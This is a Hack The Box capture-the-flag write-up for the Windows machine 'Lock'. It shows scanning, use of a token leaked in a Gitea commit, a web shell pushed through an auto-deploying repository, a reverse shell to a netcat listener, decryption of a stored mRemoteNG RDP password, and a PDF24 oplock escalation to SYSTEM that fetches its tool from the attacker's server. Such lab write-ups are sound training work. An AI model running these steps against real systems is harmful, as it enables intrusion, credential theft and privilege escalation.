

# HTB Write-Up: Lock

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Lock)     |
| Difficulty | Easy                                                           |
| OS         | Windows                                                        |
| Author     | Samurai                                                         |
| Date       | April 24, 2026                                                 |


## Reconnaissance

as always we done , we start scanning technique using nmap , and rustscan.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Lock]
└─$ cat rustscan.out       
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Breaking and entering... into the world of open ports.

[~] The config file is expected to be at "/home/samurai/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.234.64:80
Open 10.129.234.64:445
Open 10.129.234.64:3389
Open 10.129.234.64:3000
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-24 18:55 +0400
Initiating Ping Scan at 18:55
Scanning 10.129.234.64 [4 ports]
Completed Ping Scan at 18:55, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:55
Completed Parallel DNS resolution of 1 host. at 18:55, 0.51s elapsed
DNS resolution of 1 IPs took 0.51s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 18:55
Scanning 10.129.234.64 [4 ports]
Discovered open port 445/tcp on 10.129.234.64
Discovered open port 3389/tcp on 10.129.234.64
Discovered open port 3000/tcp on 10.129.234.64
Discovered open port 80/tcp on 10.129.234.64
Completed SYN Stealth Scan at 18:55, 0.08s elapsed (4 total ports)
Nmap scan report for 10.129.234.64
Host is up, received echo-reply ttl 127 (0.076s latency).
Scanned at 2026-04-24 18:55:15 +04 for 0s

PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 127
445/tcp  open  microsoft-ds  syn-ack ttl 127
3000/tcp open  ppp           syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.82 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (204B)

                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Lock]
└─$ cat nmap.out    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-24 19:01 +0400
Nmap scan report for 10.129.234.64
Host is up (0.13s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Lock - Index
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=8d9b24ab7043bd48; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=MYTbmP42yD339q51OD6c-DBksFw6MTc3NzA0Mjg4MDA0NTkzMzMwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 24 Apr 2026 15:01:20 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=30985c4b24f2ed54; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=KTQbxAS1zCE5230TaHIzkvv4Xf06MTc3NzA0Mjg4MTE1NDk0MzAwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 24 Apr 2026 15:01:21 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-24T15:01:53+00:00
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2026-04-23T14:51:44
|_Not valid after:  2026-10-23T14:51:44
|_ssl-date: 2026-04-24T15:02:34+00:00; +3s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.98%I=7%D=4/24%Time=69EB85BB%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,3000,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=
SF:8d9b24ab7043bd48;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie
SF::\x20_csrf=MYTbmP42yD339q51OD6c-DBksFw6MTc3NzA0Mjg4MDA0NTkzMzMwMA;\x20P
SF:ath=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Option
SF:s:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2024\x20Apr\x202026\x2015:01:20\x20G
SF:MT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-
SF:auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=device
SF:-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20c
SF:up\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:app
SF:lication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYS
SF:IsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfd
SF:XJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8v
SF:bG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmc
SF:iLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Metho
SF:d\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control
SF::\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-
SF:Cookie:\x20i_like_gitea=30985c4b24f2ed54;\x20Path=/;\x20HttpOnly;\x20Sa
SF:meSite=Lax\r\nSet-Cookie:\x20_csrf=KTQbxAS1zCE5230TaHIzkvv4Xf06MTc3NzA0
SF:Mjg4MTE1NDk0MzAwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSi
SF:te=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2024\x20Apr\
SF:x202026\x2015:01:21\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
SF:est,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| smb2-time: 
|   date: 2026-04-24T15:01:56
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   171.52 ms 10.10.14.1
2   171.68 ms 10.129.234.64

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.93 seconds
                        
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Lock]
└─$ 

```

## SMB Enumeration 

We start from smb to enumerate using `netexec` tool which is great network authentication / brute force tool.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Lock]
└─$ netexec smb 10.129.234.64 -u '' -p '' --shares                   
SMB         10.129.234.64   445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:False) 
SMB         10.129.234.64   445    LOCK             [-] Lock\: STATUS_ACCESS_DENIED 
SMB         10.129.234.64   445    LOCK             [-] Error enumerating shares: Error occurs while reading from remote(104)
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Lock]
└─$ netexec smb 10.129.234.64 -u 'guest' -p '' --shares
SMB         10.129.234.64   445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:False) 
SMB         10.129.234.64   445    LOCK             [-] Lock\guest: STATUS_ACCOUNT_DISABLED 
```


But we did not find anything useful for us.

## WEB Enumeration

Then we start to enumerate on Web Application

using `ffuf` , we can directory searching as following:

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Lock]
└─$ ffuf -u http://10.129.234.64/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.234.64/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.git                    [Status: 500, Size: 1208, Words: 70, Lines: 30, Duration: 1071ms]
aspnet_client           [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 77ms]
assets                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 304ms]
:: Progress: [20481/20481] :: Job [1/1] :: 466 req/sec :: Duration: [0:00:43] :: Errors: 0 ::
```

On port 80 , We could not find so much information important for us.

Then we saw from nmap output , on port 3000 , Golang server is running titled as Gitea

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Lock]
└─$ ffuf -u http://10.129.234.64:3000/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.234.64:3000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

administrator           [Status: 200, Size: 16424, Words: 1256, Lines: 358, Duration: 84ms]
favicon.ico             [Status: 301, Size: 58, Words: 3, Lines: 3, Duration: 77ms]
sitemap.xml             [Status: 200, Size: 279, Words: 4, Lines: 3, Duration: 85ms]
v2                      [Status: 401, Size: 50, Words: 1, Lines: 2, Duration: 77ms]
:: Progress: [20481/20481] :: Job [1/1] :: 524 req/sec :: Duration: [0:00:40] :: Errors: 0 ::
```

Perfect, now we can do some researching on port 3000.


```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Lock]
└─$ git clone http://10.129.234.64:3000/ellen.freeman/dev-scripts.git  
Cloning into 'dev-scripts'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 6 (delta 1), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (6/6), done.
Resolving deltas: 100% (1/1), done.
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Lock]
└─$ cd dev-scripts 
                                                                                                                                                                                              
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Lock/dev-scripts]
└─$ ls -la                                                                        
total 16
drwxrwxr-x 3 samurai samurai 4096 Apr 24 19:15 .
drwxrwxr-x 3 samurai samurai 4096 Apr 24 19:15 ..
drwxrwxr-x 7 samurai samurai 4096 Apr 24 19:15 .git
-rw-rw-r-- 1 samurai samurai 1155 Apr 24 19:15 repos.py
```


We saw one repository on target and clonned successfully.

Then we can try to find any logs that can be useful.

```bash
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Lock/dev-scripts]
└─$ git log                                                          
commit 8b78e6c3024416bce55926faa3f65421a25d6370 (HEAD -> main, origin/main, origin/HEAD)
Author: ellen.freeman <ellen.freeman@localhost.local>
Date:   Wed Dec 27 11:36:39 2023 -0800

    Update repos.py

commit dcc869b175a47ff2a2b8171cda55cb82dbddff3d
Author: ellen.freeman <ellen.freeman@localhost.local>
Date:   Wed Dec 27 11:35:42 2023 -0800

    Add repos.py
```


Perfect , When we type 

```bash
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Lock/dev-scripts]
└─$ git show dcc869b175a47ff2a2b8171cda55cb82dbddff3d
commit dcc869b175a47ff2a2b8171cda55cb82dbddff3d
Author: ellen.freeman <ellen.freeman@localhost.local>
Date:   Wed Dec 27 11:35:42 2023 -0800

    Add repos.py

diff --git a/repos.py b/repos.py
new file mode 100644
index 0000000..dcaf2ef
--- /dev/null
+++ b/repos.py
@@ -0,0 +1,40 @@
+import requests
+import sys
+
+# store this in env instead at some point
+PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
+
+def format_domain(domain):
+    if not domain.startswith(('http://', 'https://')):
+        domain = 'https://' + domain
+    return domain
+
+def get_repositories(token, domain):
+    headers = {
```


We was Personal Access Token leaked. Now we can use this python script .

```bash
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Lock/dev-scripts]
└─$ python3 repos.py http://10.129.234.64:3000/
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```


Now we identified that there is one repository which is not accessible to public without API token.

```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Lock]
└─$ git clone http://10.129.234.64:3000/ellen.freeman/website.git    
Cloning into 'website'...
Username for 'http://10.129.234.64:3000': ellen.freeman
Password for 'http://ellen.freeman@10.129.234.64:3000': 
remote: Enumerating objects: 165, done.
remote: Counting objects: 100% (165/165), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
Receiving objects: 100% (165/165), 7.16 MiB | 332.00 KiB/s, done.
Resolving deltas: 100% (35/35), done.
```


Perfect , then continue to researching.

```bash
┌──(samurai㉿samurai)-[~/…/HTB-reports/Manual-WriteUps/Lock/website]
└─$ cat readme.md 
# New Project Website

CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver       
```

It reveales us it will automatically sends files which we will push to that repo.

Lets copy ASPX Shell file to that repo and get RCE on web server.

## Initial Access

From https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx , i got it and pushed it to Target repo using API Token that we found on commits.


After pushing , Access it on /shell.aspx (whatever name you give before pushed)

Once you accessed aspx file from web , To get interactive reverse shell we have to open our netcat listener and then execute connection command on aspx.

From https://www.revshells.com/ , Copy PowerShell #3 (Base64) encoded string and Paste to command section in ASPX. Then click Execute to get shell access to target.


```bash
┌──(samurai㉿samurai)-[~/HTB/HTB-reports/Manual-WriteUps/Lock]
└─$ rlwrap nc -lnvp 9001                   
listening on [any] 9001 ...
connect to [10.10.15.33] from (UNKNOWN) [10.129.234.64] 64923

PS C:\inetpub\wwwroot> whoami
lock\ellen.freeman
PS C:\inetpub\wwwroot> 
```

Now we got our initial access.


## Lateral Movement to Local User

After some researching on target system , We found a configuration file that contains other local user password.

```bash
PS C:\Users\ellen.freeman\Appdata\Roaming\mRemoteNG> cat confCons.xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="u5ojv17tIZ1H1ND1W0YqvCslhrNSkAV6HW3l/hTV3X9pN8aLxxSUoc2THyWhrCk18xWnWi+DtnNR5rhTLz59BBxo" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="LYaCXJSFaVhirQP9NhJQH1ZwDj1zc9+G5EqWIfpVBy5qCeyyO1vVrOCRxJ/LXe6TmDmr6ZTbNr3Br5oMtLCclw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
PS C:\Users\ellen.freeman\Appdata\Roaming\mRemoteNG> 

```


In the C:\Users\ellen.freeman\Documents I can see the encrypted password of the gale.dekarios .


```bash

https://github.com/S1lkys/CVE-2023-30367-mRemoteNG-password-dumper

```

With this tool we can crack the encrypted password.

```bash

python3 mremoteng_decrypt.py -s "TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw=="
Password: ty8wnW9qCKDosXo6

```


```bash
xfreerdp3 /v:10.129.234.64 /u:gale.dekarios /p:'ty8wnW9qCKDosXo6' 
```

with this command we can connect to this user , because only rdp port is open.


After successfuly getting connection with rdp the first thing we saw is PDF24 , I check the version of PDF24 and I see it's vulnerable .

I searched it online and find a way to get administrator shell . 

First We have to download `SetOpLock.exe` this exploit . 

```bash

git clone https://github.com/p1sc3s/Symlink-Tools-Compiled.git
cd Symlink-Tools-Compiled
ls

```

let's send this exploit to target windows . 

```bash
python3 -m http.server 80
```

in windows terminal:

```bash
cd \
mkdir temp
cd temp
curl 10.10.15.33/SetOpLock.exe -o SetOpLock.exe
```

Terminal 1 : 

```bash
SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```

Terminal 2 :

```bash
msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
```

this will open a window and ask question click the first one . (Not the second option which is reboot).

after that it will open new terminal that doesn't work , 

1. right-click the terminal title 
2. click properties
3. click the Legacy console mode link(open with firefox)
4. in firefox click CTRL+O (File Open Dialog) 
5. open C:\\Windows\system32\cmd.exe

in firefox cmd.exe will be downloaded with the administrator priveleges. Open it and thats it .

```bash
whoami
nt authority\system
```


